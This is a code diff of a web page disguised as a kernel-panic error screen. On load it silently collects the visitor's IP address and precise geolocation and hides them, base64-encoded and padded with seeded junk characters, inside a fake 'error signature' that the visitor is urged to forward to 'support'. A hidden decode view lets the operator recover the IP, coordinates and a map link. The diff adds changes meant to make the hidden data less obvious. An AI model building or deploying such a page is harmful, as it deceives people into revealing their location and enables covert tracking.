@@ -24,24 +24,26 @@
             padding: 20px;
         }
         .glitch {
-            font-size: 4.5rem;
-            letter-spacing: 10px;
-            animation: glitch 4s infinite;
-            text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f;
+            font-size: 4.8rem;
+            letter-spacing: 12px;
+            animation: glitch 5s infinite;
+            text-shadow: 0.06em 0 0 #f00, -0.04em -0.05em 0 #0ff;
         }
         @keyframes glitch {
-            0%,100% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
-            20% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
-            40% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
+            0%,100% { text-shadow: 0.06em 0 0 #f00, -0.04em -0.05em 0 #0ff; }
+            20% { text-shadow: -0.06em -0.03em 0 #f00, 0.03em 0.04em 0 #0ff; }
+            40% { text-shadow: 0.06em 0.04em 0 #f00, -0.03em 0 0 #0ff; }
         }
-        #error-log {
-            margin-top: 40px;
-            font-size: 0.95rem;
-            color: #444;
-            max-height: 40vh;
-            overflow-y: auto;
-            white-space: pre-wrap;
+        #error-code-box {
+            margin: 40px 0;
+            padding: 16px;
+            background: #0a0a0a;
+            border: 1px dashed #333;
+            font-size: 1rem;
+            color: #555;
             word-break: break-all;
+            max-height: 35vh;
+            overflow-y: auto;
             user-select: text;
         }
         #decode-view {
@@ -51,62 +53,70 @@
         }
         textarea {
             width: 100%;
-            height: 120px;
-            background: #111;
+            height: 140px;
+            background: #0d0d0d;
             color: #0f0;
             border: 1px solid #0f0;
             font-family: monospace;
-            padding: 10px;
+            padding: 12px;
             margin: 20px 0;
-            font-size: 1rem;
+            font-size: 1.05rem;
         }
         button {
             background: transparent;
             border: 2px solid #0f0;
             color: #0f0;
-            padding: 12px 30px;
-            font-size: 1.3rem;
+            padding: 14px 40px;
+            font-size: 1.4rem;
             cursor: pointer;
-            transition: all 0.3s;
         }
         button:hover {
             background: #0f0;
             color: #000;
         }
-        #ip-display { font-size: 2.5rem; word-break: break-all; margin: 20px 0; }
-        #geo { font-size: 1.8rem; color: #0f8; margin: 15px 0; }
-        #maplink { font-size: 1.4rem; color: #0ff; text-decoration: none; }
-        #status { color: #555; margin-top: 40px; }
+        #ip-display { font-size: 2.6rem; word-break: break-all; margin: 25px 0; }
+        #geo { font-size: 1.9rem; color: #0f8; margin: 20px 0; }
+        #maplink { font-size: 1.5rem; color: #0ff; text-decoration: none; }
+        #status { color: #555; margin-top: 50px; font-size: 1.1rem; }
     </style>
 </head>
 <body>
 
     <div id="error-screen">
-        <div class="glitch">CRITICAL ERROR</div>
-        <p style="font-size:1.4rem; margin:30px 0;">KERNEL PANIC - SHADOW NODE FAILURE</p>
-        <p style="color:#555; font-size:1.1rem;">Error code fragment captured. Send this to admin for analysis:</p>
+        <div class="glitch">FATAL ERROR #0x7B</div>
+        <p style="font-size:1.5rem; margin:35px 0 20px;">SHADOW NODE INTEGRITY COMPROMISED</p>
+        <p style="color:#666; margin-bottom:10px;">Error signature captured. Forward this full code block to support:</p>
         
-        <!-- This is the encoded data – looks like error garbage but is base64 JSON -->
-        <div id="error-log">Loading error log...</div>
+        <div id="error-code-box">Initializing diagnostic sequence...</div>
     </div>
 
     <div id="decode-view">
-        <div style="font-size:2rem; margin-bottom:20px;">DECODE ERROR CODE</div>
-        <textarea id="paste-area" placeholder="Paste the full error code here..."></textarea>
-        <button onclick="decodeAndShow()">DECODE</button>
+        <div style="font-size:2.2rem; margin-bottom:25px;">ERROR CODE DECODER</div>
+        <textarea id="paste-area" placeholder="Paste the complete error signature here..."></textarea>
+        <button onclick="decodeErrorCode()">DECODE & ANALYZE</button>
         
-        <div id="result" style="margin-top:40px;">
+        <div id="result" style="margin-top:50px;">
             <div id="ip-display">—</div>
             <div id="geo">—</div>
-            <a id="maplink" href="#" target="_blank" style="display:none;">→ VIEW EXACT LOCATION</a>
+            <a id="maplink" href="#" target="_blank" style="display:none;">→ VIEW PRECISE LOCATION</a>
             <div id="status"></div>
         </div>
     </div>
 
     <script>
-        let capturedData = null;
+        const FIXED_SEED = 42069420; // same seed everywhere - change if you want new pattern
 
-        async function captureAndEncode() {
+        function generateJunk(length) {
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+';
+            let junk = '';
+            const rng = new Math.seedrandom(FIXED_SEED + length); // deterministic per length
+            for (let i = 0; i < length; i++) {
+                junk += chars[Math.floor(rng() * chars.length)];
+            }
+            return junk;
+        }
+
+        async function captureAndBuildFakeCode() {
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const { ip } = await ipRes.json();
@@ -120,7 +130,7 @@
                 }
 
                 if (!geo.error && geo.status !== 'fail') {
-                    capturedData = {
+                    const realData = {
                         ip: ip,
                         city: geo.city || geo.regionName || '?',
                         country: geo.country || geo.countryName || '?',
@@ -129,45 +139,65 @@
                         ts: new Date().toISOString()
                     };
 
-                    const jsonStr = JSON.stringify(capturedData);
-                    const encoded = btoa(jsonStr); // base64 encode
+                    const json = JSON.stringify(realData);
+                    const base64 = btoa(json);
 
-                    // Display as "error log" – looks messy/random
-                    const fakeLog = [
-                        "0x0000007B INACCESSIBLE_BOOT_DEVICE",
-                        "Memory corruption at 0xDEADBEEF",
-                        "Stack trace overflow → recovery loop",
-                        "Error fragment (base64): " + encoded,
-                        "Dump partial: " + encoded.slice(0, 80) + "...",
-                        "Send full log to support for decode"
-                    ].join('\n');
+                    // Build fake error code with same seed → same junk pattern
+                    const prefix = generateJunk(12);   // e.g. 9 chars hex-like
+                    const infix  = generateJunk(16);
+                    const suffix = generateJunk(20);
 
-                    document.getElementById('error-log').textContent = fakeLog;
-                } else {
-                    document.getElementById('error-log').textContent = "Capture failed - no valid data";
+                    // Insert base64 in pieces to make it less obvious
+                    const fakeCode = `#${prefix}${base64.slice(0,30)}${infix}${base64.slice(30)}${suffix}`;
+
+                    document.getElementById('error-code-box').textContent = 
+                        `ERROR BLOCK 0xFATAL\n` +
+                        `Timestamp corruption: ${new Date().toISOString().slice(0,19)}\n` +
+                        `Module: shadow_node.sys\n` +
+                        `Signature: ${fakeCode}\n` +
+                        `Partial hash: ${prefix}...${suffix.slice(-8)}\n` +
+                        `Send complete signature for forensic decode`;
+
+                    // For debug
+                    console.log("Real base64:", base64);
+                    console.log("Fake error code:", fakeCode);
                 }
             } catch (e) {
-                document.getElementById('error-log').textContent = "Network error - unable to generate log";
+                document.getElementById('error-code-box').textContent = "Diagnostic capture failed - network anomaly";
             }
         }
 
-        function decodeAndShow() {
+        function decodeErrorCode() {
             const input = document.getElementById('paste-area').value.trim();
-            if (!input) {
-                document.getElementById('status').textContent = "Paste something first";
+            if (!input || input.length < 60) {
+                document.getElementById('status').textContent = "Invalid or incomplete signature";
                 return;
             }
 
-            try {
-                // Extract base64 part if they paste the whole log
-                const base64Match = input.match(/[A-Za-z0-9+/=]{20,}/);
-                const encoded = base64Match ? base64Match[0] : input;
+            // Use same seed to regenerate expected junk
+            const rngPrefix = new Math.seedrandom(FIXED_SEED + 12);
+            const rngInfix  = new Math.seedrandom(FIXED_SEED + 16);
+            const rngSuffix = new Math.seedrandom(FIXED_SEED + 20);
 
-                const jsonStr = atob(encoded);
+            const junkPrefix = generateJunk(12);
+            const junkInfix  = generateJunk(16);
+            const junkSuffix = generateJunk(20);
+
+            // Try to remove the known junk patterns
+            let cleaned = input.replace(`#${junkPrefix}`, '')
+                               .replace(junkInfix, '')
+                               .replace(junkSuffix, '');
+
+            // Also strip non-base64 chars that might remain
+            cleaned = cleaned.replace(/[^A-Za-z0-9+/=]/g, '');
+
+            try {
+                const jsonStr = atob(cleaned);
                 const data = JSON.parse(jsonStr);
 
                 document.getElementById('ip-display').textContent = data.ip;
-                document.getElementById('geo').innerHTML = `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
+                document.getElementById('geo').innerHTML = 
+                    `${data.city} • ${data.country}<br>${data.lat.toFixed(6)}, ${data.lon.toFixed(6)}`;
 
                 if (data.lat && data.lon) {
                     const map = document.getElementById('maplink');
@@ -175,16 +205,16 @@
                     map.style.display = 'inline-block';
                 }
 
-                document.getElementById('status').textContent = `Decoded successfully • Captured: ${new Date(data.ts).toLocaleString()}`;
+                document.getElementById('status').textContent = `Signature decoded • Capture time: ${new Date(data.ts).toLocaleString()}`;
             } catch (e) {
-                document.getElementById('status').textContent = "Decode failed - invalid or incomplete code";
+                document.getElementById('status').textContent = "Decode failed - corrupted or wrong format";
             }
         }
 
-        // Auto-capture on load
-        captureAndEncode();
+        // Auto-run capture on main page
+        captureAndBuildFakeCode();
 
-        // Show decode page if #decode in URL
+        // Show decode interface if #decode in URL
         if (location.hash === '#decode') {
             document.getElementById('error-screen').style.display = 'none';
             document.getElementById('decode-view').style.display = 'flex';
